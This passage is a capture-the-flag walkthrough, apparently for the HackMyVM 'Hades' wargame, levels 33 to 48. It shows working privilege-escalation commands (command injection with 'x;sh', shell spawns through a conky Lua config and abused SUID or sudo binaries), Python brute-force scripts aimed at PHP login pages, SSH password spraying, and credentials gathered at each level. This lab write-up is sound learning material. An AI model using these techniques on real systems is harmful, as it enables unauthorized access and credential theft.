  1050242      4 -rw-r-----   1 root     hera           22 Apr  5  2024 ./flagz.txt
  1050243      4 -rw-r-----   1 root     hera          182 Apr  5  2024 ./mission.txt
  1050238      4 -rw-r--r--   1 hera     hera          807 Apr 23  2023 ./.profile
################
# MISSION 0x33 #
################
User hermione would like to know what hera was doing.
```

### Hidden Flag (0xI)

```bash
hera@hades:~$ cat ./.bash_history

ls
ps
sudo -u hermione bash
cp /etc /etc2
^LVFcQoSJeZgUltXJKnpZ^
ls
id
cat /usr/hera
rm /usr/hera
whoami
zip -R etc.zip /etc
```

### Normal Flag

There's something in `/etc`
```bash
hera@hades:~$ cat /usr/hera
vzhOebSSplFoXPKxwtqU
```

> Creds: `hermione:vzhOebSSplFoXPKxwtqU`

## Level 34

```bash
hermione@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2025(hermione) gid=2025(hermione) groups=2025(hermione),6666(beast)
  1050245      4 -rw-r--r--   1 hermione hermione      220 Apr 23  2023 ./.bash_logout
  1050246      4 -rw-r--r--   1 hermione hermione     3526 Apr 23  2023 ./.bashrc
  1050249      4 -rw-r-----   1 root     hermione       22 Apr  5  2024 ./flagz.txt
  1050250      4 -rw-r-----   1 root     hermione      158 Apr  5  2024 ./mission.txt
  1050248     16 -rwxrwxrwx   1 hermione hermione    16056 Apr  5  2024 ./beastgroup
  1050247      4 -rw-r--r--   1 hermione hermione      807 Apr 23  2023 ./.profile
################
# MISSION 0x34 #
################
User hero only talks to some groups.
```

### Hidden Flag (0xN)

```bash
hermione@hades:~$ find / -group beast -ls 2>/dev/null
    22032      4 -rw-r-----   1 root     beast          23 Apr  5  2024 /usr/sbin/iv
hermione@hades:~$ cat /usr/sbin/iv
^hXwcPHoLKyHdreglfUwz^
```

### Normal Flag

```bash
hermione@hades:~$ ./beastgroup
I only trust group 6666, you are group 2025

hermione@hades:~$ sg beast ./beastgroup
vlImTDSGnTMwLFgRWCOc
```

> Creds: `hero:vlImTDSGnTMwLFgRWCOc`

## Level 35

```bash
hero@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2026(hero) gid=2026(hero) groups=2026(hero)
  1050255     16 ---s--s---   1 root     hero        16056 Apr  5  2024 ./cleaner
  1050252      4 -rw-r--r--   1 hero     hero          220 Apr 23  2023 ./.bash_logout
  1050253      4 -rw-r--r--   1 hero     hero         3526 Apr 23  2023 ./.bashrc
  1050256      4 -rw-r-----   1 root     hero           22 Apr  5  2024 ./flagz.txt
  1050257      4 -rw-r-----   1 root     hero          173 Apr  5  2024 ./mission.txt
  1050254      4 -rw-r--r--   1 hero     hero          807 Apr 23  2023 ./.profile
################
# MISSION 0x35 #
################
User hestia likes to keep the screen clean.
```

When we execute this binary nothing happens, but if you notice arrow keys stop working meaning this is a new bash instance
```bash
hero@hades:~$ ./cleaner
hero@hades:~$ id
uid=2026(hero) gid=2226(her0) groups=2226(her0),2026(hero)
```

```bash
hero@hades:~$ find / -group her0 2>/dev/null | grep -v '/proc/'
/usr/share/libs
hero@hades:~$ cat /usr/share/libs
opTNnZQAuFJsauNPHXVq
```

> Creds: `hestia:opTNnZQAuFJsauNPHXVq`

## Level 36

```bash
hestia@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2027(hestia) gid=2027(hestia) groups=2027(hestia)
  1050259      4 -rw-r--r--   1 hestia   hestia        220 Apr 23  2023 ./.bash_logout
  1050260      4 -rw-r--r--   1 hestia   hestia       3526 Apr 23  2023 ./.bashrc
  1050263    196 -r-s--s---   1 ianthe   hestia     198960 Apr  5  2024 ./less
  1050262      4 -rw-r-----   1 root     hestia         22 Apr  5  2024 ./flagz.txt
  1050264      4 -rw-r-----   1 root     hestia        157 Apr  5  2024 ./mission.txt
  1050261      4 -rw-r--r--   1 hestia   hestia        807 Apr 23  2023 ./.profile
################
# MISSION 0x36 #
################
User ianthe has left us her own less.
```

[https://gtfobins.github.io/gtfobins/less/](https://gtfobins.github.io/gtfobins/less/)

```bash
hestia@hades:~$ ./less /pwned/ianthe/flagz.txt
/pwned/ianthe/flagz.txt: Permission denied

hestia@hades:~$ find / -user ianthe 2>/dev/null
/opt/ianthe_pass.txt
/pwned/hestia/less

hestia@hades:~$ ./less -F /opt/ianthe_pass.txt
DphioLqgVIIFclTwBsMP
```

> Creds: `ianthe:DphioLqgVIIFclTwBsMP`

## Level 37

### Old Challenge

```bash
ianthe@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2028(ianthe) gid=2028(ianthe) groups=2028(ianthe)
  1050266      4 -rw-r--r--   1 ianthe   ianthe        220 Apr 23  2023 ./.bash_logout
  1050267      4 -rw-r--r--   1 ianthe   ianthe       3526 Apr 23  2023 ./.bashrc
  1050269      4 -rw-r-----   1 root     ianthe         22 Apr  5  2024 ./flagz.txt
  1050271      4 -rw-r-----   1 root     ianthe        248 Apr  5  2024 ./mission.txt
  1050270      4 -rw-r-----   1 root     ianthe        214 Apr  5  2024 ./irene_auth.php.old
  1050268      4 -rw-r--r--   1 ianthe   ianthe        807 Apr 23  2023 ./.profile
################
# MISSION 0x37 #
################
Seems that irene is developing an auth system http://localhost/irene_auth.php
```

```bash
ianthe@hades:~$ curl 0/irene_auth.php
No pazz

ianthe@hades:~$ curl 0/irene_auth.php -d 'pazz=letmein'
No pazz

ianthe@hades:~$ curl '0/irene_auth.php?pazz=password'
NOP
```

Totally missed the source code...
```bash
ianthe@hades:~$ cat ./irene_auth.php.old

<?php
$PAZZ = "Sardina123"; // Put real pass for irene.
if (isset($_GET["pazz"])) {
    if (strcmp($PAZZ, $_GET["pazz"]) == 0) {
        print $PAZZ;
    } else {
        print "NOP";
    }
} else {
    print "No pazz";
}

?>
```

This PHP script defines a hardcoded password (`$PAZZ`) and checks if a `pazz` parameter is provided via GET Param. If present, it compares the input to the hardcoded value using `strcmp`. If the password matches exactly, it echoes the password back; if not, it returns `"NOP"`. If the parameter isn't supplied at all, it returns `"No pazz"`. 

While searching for vulnerabilities I came across post: [https://blog.raw.pm/en/ABCTF-2016-ABCTF-70-L33t-H4xx0r-Web-Exploitation](https://blog.raw.pm/en/ABCTF-2016-ABCTF-70-L33t-H4xx0r-Web-Exploitation)  which has almost the same vulnerability as given source code.

Either the challenge is very old and not exploitable anymore, or we need another bypass method...

![hades-6.png](/assets/ctf/hackmyvm/hades-6.png)

AFAIK this vulnerability was fixed in `PHP>7` and machines have `>8`
```bash
ianthe@hades:~$ php -v
PHP 8.2.7 (cli) (built: Jun  9 2023 19:37:27) (NTS)
Copyright (c) The PHP Group
Zend Engine v4.2.7, Copyright (c) Zend Technologies
    with Zend OPcache v8.2.7, Copyright (c), by Zend Technologies
```

### New Challenge

After contacting the support team they have updated the challenge with new source code.
```php
ianthe@hades:~$ cat irene_auth.php.old
<?php
session_start();
$allowed_domains = ["hackmyvm.hmv"];
if (in_array($_SERVER["HTTP_ORIGIN"], $allowed_domains)) {
    header("Access-Control-Allow-Origin: {$_SERVER["HTTP_ORIGIN"]}");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
    header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization");

    $_SESSION["loggedin"] = isset($_SESSION["loggedin"])
        ? $_SESSION["loggedin"]
        : false;

    if (isset($_POST["username"]) && isset($_POST["password"])) {
        if ($_POST["username"] == "admin" && $_POST["password"] == "xxxxx") {
            $_SESSION["loggedin"] = true;
            header("Location: index.php");
        } else {
            $error = "Invalid username or password";
        }
    }

    if ($_SESSION["loggedin"] == true) {
        $flag = "XXXXX";
        echo $flag;
    } else {
        echo '
            <form method="post" action="">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
                <br>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
                <br>
                <input type="submit" value="Login">
            </form>
            ';

        if (isset($error)) {
            echo "<p>" . $error . "</p>";
        }
    }
} else {
    header("HTTP/1.1 403 Forbidden");
}
?>
```

Now we have to essentially bruteforce the password, username we want is admin and password is unknown.
```html
ianthe@hades:~$ curl 0/irene_auth.php -H 'Origin: hackmyvm.hmv' -d 'username=admin&password=password'
	<form method="post" action="">
		<label for="username">Username:</label>
		<input type="text" id="username" name="username" required>
		<br>
		<label for="password">Password:</label>
		<input type="password" id="password" name="password" required>
		<br>
		<input type="submit" value="Login">
	</form>
	<p>Invalid username or password</p>
```

```python
import asyncio
import sys
from urllib.request import Request, urlopen
from urllib.parse import urlencode

HOST = "127.0.0.1"
PATH = "/irene_auth.php"
FAILED = "Invalid username or password"

def try_word(word):
    try:
        data = urlencode({ "username": "admin", "password": word }).encode()

        req = Request(f"http://{HOST}{PATH}", data=data, headers={"Origin": "hackmyvm.hmv"})
        with urlopen(req) as response:
            body = response.read().decode(errors="ignore")

        if FAILED not in body:
            return f"[+] Found: {word} | Response snippet: {body}"
            
    except Exception as e:
        print(f"[!] Error on '{word}': {e}")

    return None

async def main():
    loop = asyncio.get_event_loop()
    with open(sys.argv[1], encoding="latin-1") as f:
        for index, word in enumerate(f, start=1):
            word = word.strip()
            result = await loop.run_in_executor(None, try_word, word)
            if result:
                print(result)
                break
            elif index % 100 == 0:
                print(f"[*] Tested {index} words so far...")

if __name__ == "__main__":
    asyncio.run(main())
```

```bash
ianthe@hades:~$ python3 /tmp/b.py /var/tmp/rockyou/1000.txt
...
[*] Tested 1000 words so far...
[!] Error on 'admin': HTTP Error 404: Not Found
[*] Tested 1100 words so far...
```

`urllib.request` by default follows redirect hence error was raised for 404, but we can test anomaly manually.
```bash
ianthe@hades:~$ curl 0/irene_auth.php -H 'Origin: hackmyvm.hmv' -d 'username=admin&password=admin' -i
HTTP/1.1 302 Found
Server: nginx/1.22.1
Date: Sat, 16 Aug 2025 15:11:59 GMT
Set-Cookie: PHPSESSID=psklvdau4b56v086jh3mlvhj7t; path=/
Location: index.php
...

TDyuLyWLDksEhgmAYDJC

ianthe@hades:~$ curl 0/irene_auth.php -H 'Origin: hackmyvm.hmv' -d 'username=admin&password=admin' -L
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>
```

> Creds: `irene:TDyuLyWLDksEhgmAYDJC`

## Level 38

```bash
irene@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2029(irene) gid=2029(irene) groups=2029(irene)
  1050273      4 -rw-r--r--   1 irene    irene         220 Apr 23  2023 ./.bash_logout
  1050274      4 -rw-r--r--   1 irene    irene        3526 Apr 23  2023 ./.bashrc
  1050277     16 ---s--s---   1 root     irene       16216 Apr  5  2024 ./hatechars
  1050276      4 -rw-r-----   1 root     irene          22 Apr  5  2024 ./flagz.txt
  1050278      4 -rw-r-----   1 root     irene         145 Apr  5  2024 ./mission.txt
  1050275      4 -rw-r--r--   1 irene    irene         807 Apr 23  2023 ./.profile
################
# MISSION 0x38 #
################
User iris hates some characters.
```

```bash
irene@hades:~$ ./hatechars
Enter file to show:
x
/bin/cat: x: No such file or directory
```

Either `b` or `a` was banned, but `sh` worked and it triggered the shell, slashes and dots were also bad characters.
```bash
irene@hades:~$ ./hatechars
Enter file to show:
x;bash
Invalid character!!
irene@hades:~$ ./hatechars
Enter file to show:
x;sh
/bin/cat: x: No such file or directory
$ id
uid=2030(iris) gid=2029(irene) groups=2029(irene)
```

However this doesn't exactly get us in `iris` user home directory, we need to be part of `iris` **group** to be able to read contents.
```bash
iris@hades:~$ ls -ld /pwned/iris
drwxr-x--- 2 root iris 4096 Apr  5  2024 /pwned/iris
```

```bash
iris@hades:~$ find / -user iris -ls 2>/dev/null | grep -v '/proc/'
   658925      4 -rw-r--r--   1 iris     iris           21 May  3 15:19 /var/tmp/salida.txt
   921375      4 -r--r-----   1 iris     iris           21 Jul 22  2012 /etc/met.txt
iris@hades:~$ cat /var/tmp/salida.txt
mdAXiSXteTPiGGTpmajP
iris@hades:~$ cat /etc/met.txt
FiqGNcXumTKwLTPRqXMh
```

> Creds: `iris:FiqGNcXumTKwLTPRqXMh`

## Level 39

```bash
iris@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2030(iris) gid=2030(iris) groups=2030(iris)
  1050280      4 -rw-r--r--   1 iris     iris          220 Apr 23  2023 ./.bash_logout
  1050281      4 -rw-r--r--   1 iris     iris         3526 Apr 23  2023 ./.bashrc
  1050283      4 -rw-r-----   1 root     iris           22 Apr  5  2024 ./flagz.txt
  1050284      4 -rw-r-----   1 root     iris          137 Apr  5  2024 ./mission.txt
  1050282      4 -rw-r--r--   1 iris     iris          807 Apr 23  2023 ./.profile
################
# MISSION 0x39 #
################
User kore likes to navigate!
```

We kind already found this file in previous challenge
```bash
iris@hades:~$ find / -user iris -ls 2>/dev/null | grep -v '/proc/'
   658925      4 -rw-r--r--   1 iris     iris           21 May  3 15:19 /var/tmp/salida.txt
   921375      4 -r--r-----   1 iris     iris           21 Jul 22  2012 /etc/met.txt
iris@hades:~$ cat /var/tmp/salida.txt
mdAXiSXteTPiGGTpmajP
```

> Creds: `kore:mdAXiSXteTPiGGTpmajP`

## Level 40

```bash
kore@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2031(kore) gid=2031(kore) groups=2031(kore)
  1050286      4 -rw-r--r--   1 kore     kore          220 Apr 23  2023 ./.bash_logout
  1050287      4 -rw-r--r--   1 kore     kore         3526 Apr 23  2023 ./.bashrc
  1050289      4 -rw-r-----   1 root     kore           22 Apr  5  2024 ./flagz.txt
  1050290      4 -rw-r-----   1 root     kore          156 Apr  5  2024 ./mission.txt
  1050288      4 -rw-r--r--   1 kore     kore          807 Apr 23  2023 ./.profile
################
# MISSION 0x40 #
################
User leda always wanted to edit videos.
```

```bash
kore@hades:~$ sudo -l
Sorry, user kore may not run sudo on hades.
kore@hades:~$ find / -user leda -ls 2>/dev/null | grep -v '/proc/'
  1050520    288 -rwS--s---   1 leda     kore       293288 Nov 11  2023 /usr/bin/ffmpeg
   658264      4 drwxr-xr-x   2 leda     leda         4096 Oct 15  2024 /var/tmp/.kileros/leda
   921364      4 -r--r-----   1 leda     leda           14 Sep 21  2005 /etc/led
```

After some research I found this: [Is it possible to provide input files list to FFmpeg in a text file instead of on command line?](https://stackoverflow.com/questions/64407313/is-it-possible-to-provide-input-files-list-to-ffmpeg-in-a-text-file-instead-of-o)
```bash
kore@hades:~$ ffmpeg -f concat -i /etc/led -c:v hevc_nvenc -
ffmpeg version 5.1.4-0+deb12u1 Copyright (c) 2000-2023 the FFmpeg developers
...
[concat @ 0x5638e9223d80] Line 1: unknown keyword 'NODEVILINHELL'
/etc/led: Invalid data found when processing input
```

> Creds: `leda:NODEVILINHELL`

## Level 41

```bash
leda@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2032(leda) gid=2032(leda) groups=2032(leda)
  1050292      4 -rw-r--r--   1 leda     leda          220 Apr 23  2023 ./.bash_logout
  1050293      4 -rw-r--r--   1 leda     leda         3526 Apr 23  2023 ./.bashrc
  1050295      4 -rw-r-----   1 root     leda           22 Apr  5  2024 ./flagz.txt
  1050296      4 -rw-r-----   1 root     leda          129 Apr  5  2024 ./mission.txt
  1050294      4 -rw-r--r--   1 leda     leda          807 Apr 23  2023 ./.profile
################
# MISSION 0x41 #
################
User maia hears everything.
```

```bash
leda@hades:~$ sudo -l
Matching Defaults entries for leda on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User leda may run the following commands on hades:
    (maia) NOPASSWD: /usr/bin/espeak
```

[https://gtfobins.github.io/gtfobins/espeak](https://gtfobins.github.io/gtfobins/espeak)

```bash
leda@hades:~$ espeak --help

eSpeak text-to-speech: 1.48.15  16.Apr.15  Data at: /usr/lib/x86_64-linux-gnu/espeak-data

leda@hades:~$ sudo -u maia espeak -qXf /pwned/maia/flagz.txt | grep -oP "(Translate|Found:) '\K[^']+" | tr -d '_\n'; echo
^^gwsdbtcixdzdntrzvgt^^
```

Flag required single `^` symbols, submit and grab next password.

> Creds: `maia:GIVEMEANEWMIND`

## Level 42

```bash
maia@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2033(maia) gid=2033(maia) groups=2033(maia)
  1050298      4 -rw-r--r--   1 maia     maia          220 Apr 23  2023 ./.bash_logout
  1050299      4 -rw-r--r--   1 maia     maia         3526 Apr 23  2023 ./.bashrc
  1050301      8 -rw-r-----   1 root     maia         7299 Apr  5  2024 ./broken
  1050302      4 -rw-r-----   1 root     maia           22 Apr  5  2024 ./flagz.txt
  1050303      4 -rw-r-----   1 root     maia          169 Apr  5  2024 ./mission.txt
  1050300      4 -rw-r--r--   1 maia     maia          807 Apr 23  2023 ./.profile
################
# MISSION 0x42 #
################
It seems that user nephele has broken the image.
```

```bash
maia@hades:~$ hexdump -C broken | head
00000000  00 00 00 00 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |............IHDR|
00000010  00 00 04 cd 00 00 02 09  08 02 00 00 00 39 e1 5d  |.............9.]|
00000020  37 00 00 00 01 73 52 47  42 00 ae ce 1c e9 00 00  |7....sRGB.......|
00000030  00 04 67 41 4d 41 00 00  b1 8f 0b fc 61 05 00 00  |..gAMA......a...|
00000040  00 09 70 48 59 73 00 00  0e c3 00 00 0e c3 01 c7  |..pHYs..........|
00000050  6f a8 64 00 00 1c 18 49  44 41 54 78 5e ed dd 51  |o.d....IDATx^..Q|
00000060  56 e3 c0 11 05 d0 ac 8b  05 b1 1e 56 c3 66 58 4c  |V..........V.fXL|
00000070  62 83 06 8c 5d 25 75 4b  cf 1e 98 dc fb 93 04 a4  |b...]%uK........|
00000080  56 a9 5a f6 a9 17 06 f3  9f ff 02 00 00 40 8e 9c  |V.Z..........@..|
00000090  09 00 00 40 92 9c 09 00  00 40 92 9c 09 00 00 40  |...@.....@.....@|
```

The PNG file is missing header bytes: [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

```bash
└─$ sshpass -p 'GIVEMEANEWMIND' scp -P 6666 maia@hades.hackmyvm.eu:broken .
└─$ file broken
broken: data
└─$ cp broken broken.bak
# Overwrite the magic bytes
└─$ printf '\x89PNG\r\n\x1a\n' | dd of=broken bs=1 conv=notrunc
└─$ file broken
broken: PNG image data, 1229 x 521, 8-bit/color RGB, non-interlaced
```

![hades-7.png](/assets/ctf/hackmyvm/hades-7.png)

Quick Image to Text
```bash
└─$ tesseract broken output
└─$ cat output.txt
rZtaitCxlEIRxBayVpgZ
```

> Creds: `nephele:rZtaitCxlEIRxBayVpgZ`

## Level 43

```bash
nephele@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2034(nephele) gid=2034(nephele) groups=2034(nephele)
  1050315      4 -rw-r--r--   1 nephele  nephele       220 Apr 23  2023 ./.bash_logout
  1050316      4 -rw-r--r--   1 nephele  nephele      3526 Apr 23  2023 ./.bashrc
  1050318      4 -rw-r-----   1 root     nephele        22 Apr  5  2024 ./flagz.txt
  1050319      4 -rw-r-----   1 root     nephele       179 Apr  5  2024 ./mission.txt
  1050317      4 -rw-r--r--   1 nephele  nephele       807 Apr 23  2023 ./.profile
################
# MISSION 0x43 #
################
The nyx user visits some websites that we do not know.
```

Few challenges ago we saw an odd hostname in `/etc/hosts`, if we try the password it's a success.
```bash
nephele@hades:~$ curl whatsmypass.hmv
HXisrOPSdTcSSTEyyaLn
```

> Creds: `nyx:HXisrOPSdTcSSTEyyaLn`

## Level  44

```bash
nyx@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2035(nyx) gid=2035(nyx) groups=2035(nyx)
  1050321      4 -rw-r--r--   1 nyx      nyx           220 Apr 23  2023 ./.bash_logout
  1050322      4 -rw-r--r--   1 nyx      nyx          3526 Apr 23  2023 ./.bashrc
  1050324      4 -rw-r-----   1 root     nyx            22 Apr  5  2024 ./flagz.txt
  1050325      4 -rw-r-----   1 root     nyx           171 Apr  5  2024 ./mission.txt
  1050323      4 -rw-r--r--   1 nyx      nyx           807 Apr 23  2023 ./.profile
################
# MISSION 0x44 #
################
User pallas has her desktop tuned with conky.
```

**[conky](https://github.com/brndnmtthws/conky)**: Light-weight system monitor for X, Wayland, and other things, too
```bash
nyx@hades:~$ sudo -l
Matching Defaults entries for nyx on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User nyx may run the following commands on hades:
    (pallas) NOPASSWD: /usr/bin/conky
```

Looking at configs over [Wiki](https://github.com/brndnmtthws/conky/wiki/Configs) it seems that config files are just Lua scripts.
```bash
nyx@hades:~$ echo 'os.execute("/bin/bash")' > /tmp/letmein.config

nyx@hades:~$ sudo -u pallas conky -c /tmp/letmein.config

pallas@hades:/pwned/nyx$ id
uid=2036(pallas) gid=2036(pallas) groups=2036(pallas)
pallas@hades:/pwned/nyx$ cat /pwned/pallas/flagz.txt
^irzKewMCfnhnIMTCJlW^
```

> Creds: `pallas:wWxyXnNbmjxNMEAIjbjT`

## Level 45

```bash
pallas@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2036(pallas) gid=2036(pallas) groups=2036(pallas)
  1050327      4 -rw-r--r--   1 pallas   pallas        220 Apr 23  2023 ./.bash_logout
  1050328      4 -rw-r--r--   1 pallas   pallas       3526 Apr 23  2023 ./.bashrc
  1050330      4 -rw-r-----   1 root     pallas         22 Apr  5  2024 ./flagz.txt
  1050331      4 -rw-r-----   1 root     pallas        145 Apr  5  2024 ./mission.txt
  1050329      4 -rw-r--r--   1 pallas   pallas        807 Apr 23  2023 ./.profile
################
# MISSION 0x45 #
################
User pandora likes squares.
```

```bash
pallas@hades:~$ sudo -l
Matching Defaults entries for pallas on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pallas may run the following commands on hades:
    (pandora) NOPASSWD: /usr/bin/qrencode
```

```bash
pallas@hades:~$ qrencode
qrencode version 4.1.1
Copyright (C) 2006-2017 Kentaro Fukuchi
Usage: qrencode [-o FILENAME] [OPTION]... [STRING]
Encode input data in a QR Code and save as a PNG or EPS image.

  -h           display this message.
  --help       display the usage of long options.
  -o FILENAME  write image to FILENAME. If '-' is specified, the result
               will be output to standard output. If -S is given, structured
               symbols are written to FILENAME-01.png, FILENAME-02.png, ...
               (suffix is removed from FILENAME, if specified)
  -r FILENAME  read input data from FILENAME.
  -s NUMBER    specify module size in dots (pixels). (default=3)
  -l {LMQH}    specify error correction level from L (lowest) to H (highest).
               (default=L)
  -v NUMBER    specify the minimum version of the symbol. (default=auto)
  -m NUMBER    specify the width of the margins. (default=4 (2 for Micro))
  -d NUMBER    specify the DPI of the generated PNG. (default=72)
  -t {PNG,PNG32,EPS,SVG,XPM,ANSI,ANSI256,ASCII,ASCIIi,UTF8,UTF8i,ANSIUTF8,ANSIUTF8i,ANSI256UTF8}
               specify the type of the generated image. (default=PNG)
  -S           make structured symbols. Version number must be specified with '-v'.
  -k           assume that the input text contains kanji (shift-jis).
  -c           encode lower-case alphabet characters in 8-bit mode. (default)
  -i           ignore case distinctions and use only upper-case characters.
  -8           encode entire data in 8-bit mode. -k, -c and -i will be ignored.
  -M           encode in a Micro QR Code.
  -V           display the version number and copyrights of the qrencode.
  [STRING]     input data. If it is not specified, data will be taken from
               standard input.

  Try "qrencode --help" for more options.
```

```bash
pallas@hades:~$ sudo -u pandora qrencode -r /pwned/pandora/flagz.txt -o /tmp/letmein.png

└─$ sshpass -p 'wWxyXnNbmjxNMEAIjbjT' scp -P 6666 pallas@hades.hackmyvm.eu:/tmp/letmein.png .
└─$ sudo apt install -y zbar-tools
└─$ zbarimg letmein.png
QR-Code:^pjDuPNQVgyhgigOIiwm^
```

> Creds: `pandora:HhVHfmbBIiZbZSgcgadh`

## Level 46

```bash
pandora@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2037(pandora) gid=2037(pandora) groups=2037(pandora)
  1050333      4 -rw-r--r--   1 pandora  pandora       220 Apr 23  2023 ./.bash_logout
  1050334      4 -rw-r--r--   1 pandora  pandora      3526 Apr 23  2023 ./.bashrc
  1050336      4 -rw-r-----   1 root     pandora        22 Apr  5  2024 ./flagz.txt
  1050337      4 -rw-r-----   1 root     pandora       155 Apr  5  2024 ./mission.txt
  1050335      4 -rw-r--r--   1 pandora  pandora       807 Apr 23  2023 ./.profile
################
# MISSION 0x46 #
################
User penelope lets us do something...
```

```bash
pandora@hades:~$ find / -user penelope -ls 2>/dev/null | grep -v /var/tmp
  1050557     68 -rwsr-sr-x   1 penelope pandora     69112 Apr  5  2024 /usr/bin/getty
   921388      4 -r--------   1 penelope penelope       21 Jan 20  1979 /etc/pene.conf
```

```bash
pandora@hades:~$ getty -f /etc/pene.conf -n -

anoRxVKulaoMNKMrddVe

login: Cannot possibly work without effective root
```

> Creds: `penelope:anoRxVKulaoMNKMrddVe`

## Level 47

```bash
penelope@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
uid=2038(penelope) gid=2038(penelope) groups=2038(penelope)
  1050339      4 -rw-r--r--   1 penelope penelope      220 Apr 23  2023 ./.bash_logout
  1050340      4 -rw-r--r--   1 penelope penelope     3526 Apr 23  2023 ./.bashrc
  1050342      4 -rw-r-----   1 root     penelope       22 Apr  5  2024 ./flagz.txt
  1050343      4 -rw-r-----   1 root     penelope      315 Apr  5  2024 ./mission.txt
  1050341      4 -rw-r--r--   1 penelope penelope      807 Apr 23  2023 ./.profile
################
# MISSION 0x47 #
################
If we give a username (user) and password (password) at http://localhost/request.php, user phoebe may give us her password.
```

Most probably credentials will be in passwords we gathered so far, include user we want and password from Level 0 just in case.
```bash
penelope@hades:~$ nano /tmp/allcreds.txt
penelope@hades:~$ echo 'phoebe/begood!' >> /tmp/allcreds.txt
```

Setup script to bruteforce GET and POST.
```python
import asyncio
import sys
import time
from urllib.request import Request, urlopen
from urllib.parse import urlencode

HOST = "127.0.0.1"
PATH = "/request.php"
FAILED = "NOTHING."
DELAY = 0.5  # seconds between attempts

def brute(username, password):
    # Try GET
    try:
        url = f"http://{HOST}{PATH}?user={username}&password={password}"
        with urlopen(url) as response:
            body = response.read().decode(errors="ignore").strip()
        
        if FAILED not in body:
            return f"[+] Found via GET: {username}:{password} | Response snippet: {body}"
        # else:
        #     print(f"[-] GET failed: {username}:{password} | Response snippet: {body}")
    except Exception as e:
        print(f"[!] GET error on '{username}:{password}': {e}")

    # Try POST
    try:
        data = urlencode({"user": username, "password": password}).encode()
        req = Request(f"http://{HOST}{PATH}", data=data, method="POST")
        with urlopen(req) as response:
            body = response.read().decode(errors="ignore").strip()
        
        if FAILED not in body:
            return f"[+] Found via POST: {username}:{password} | Response snippet: {body}"
        # else:
        #     print(f"[-] POST failed: {username}:{password} | Response snippet: {body}")
    except Exception as e:
        print(f"[!] POST error on '{username}:{password}': {e}")

    return None

async def main():
    loop = asyncio.get_event_loop()

    with open(sys.argv[1], encoding="latin-1") as uf, open(sys.argv[2], encoding="latin-1") as pf:
        usernames = [u.strip() for u in uf]
        passwords = [p.strip() for p in pf]

    for username in usernames:
        for password in passwords:
            result = await loop.run_in_executor(None, brute, username, password)
            if result:
                print(result)
                # return

if __name__ == "__main__":
    asyncio.run(main())
```

```bash
penelope@hades:~$ python3 -u /tmp/b.py <(cut -d/ -f1 /tmp/allcreds.txt) <(cut -d/ -f2 /tmp/allcreds.txt) | tee /tmp/b.log
[+] Found via GET: acantha:mYYLhLBSkrzZqFydxGkn | Response snippet: yWFLtSNQArEBTHtWgkKd
[+] Found via GET: alala:DsYzpJQrCEndEWIMxWxu | Response snippet: yABCtSNQArEBTHtWgkKd
[+] Found via GET: aphrodite:begood! | Response snippet: FPLwKmmKhcWAwRxiaBDN
[+] Found via GET: asia:GztROerShmiyiCIlfepG | Response snippet: YRturIymmHSdBmEClEGe
[+] Found via GET: aura:TiqpedAFjwmVyBlYpzRh | Response snippet: HIiaojeORLaJBVSPDDCZ
[+] Found via GET: delia:bNCvocyOpoMVeCtxrhTt | Response snippet: QHLjVBGSiRShtWpMwFjj
[+] Found via GET: eos:vlImTDSGnTMwLFgRWCOc | Response snippet: FkyuXkkJNONDChoaKzOI
[+] Found via GET: ianthe:DphioLqgVIIFclTwBsMP | Response snippet: NOP
[+] Found via GET: nephele:FkyuXkkJNONDChoaKzOI | Response snippet: kmQMpZsXgOsnzGReRcoZ

penelope@hades:~$ grep -oP 'snippet: \K.*' /tmp/b.log
yWFLtSNQArEBTHtWgkKd
yABCtSNQArEBTHtWgkKd
FPLwKmmKhcWAwRxiaBDN
FPLwKmmKhcWAwRxiaBDN
YRturIymmHSdBmEClEGe
HIiaojeORLaJBVSPDDCZ
QHLjVBGSiRShtWpMwFjj
FkyuXkkJNONDChoaKzOI
NOP
kmQMpZsXgOsnzGReRcoZ

└─$ netexec ssh hades.hackmyvm.eu --port 6666 -u phoebe -p passwords.txt
SSH         185.233.104.77  6666   hades.hackmyvm.eu [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u2
SSH         185.233.104.77  6666   hades.hackmyvm.eu [-] phoebe:yWFLtSNQArEBTHtWgkKd
SSH         185.233.104.77  6666   hades.hackmyvm.eu [-] phoebe:yABCtSNQArEBTHtWgkKd
SSH         185.233.104.77  6666   hades.hackmyvm.eu [+] phoebe:FPLwKmmKhcWAwRxiaBDN  Linux - Shell access!
```

> Creds: `phoebe:FPLwKmmKhcWAwRxiaBDN`

## Level 48

```bash
phoebe@hades:~$ id; find . -type f -ls; cat mission.txt; cat flagz.txt
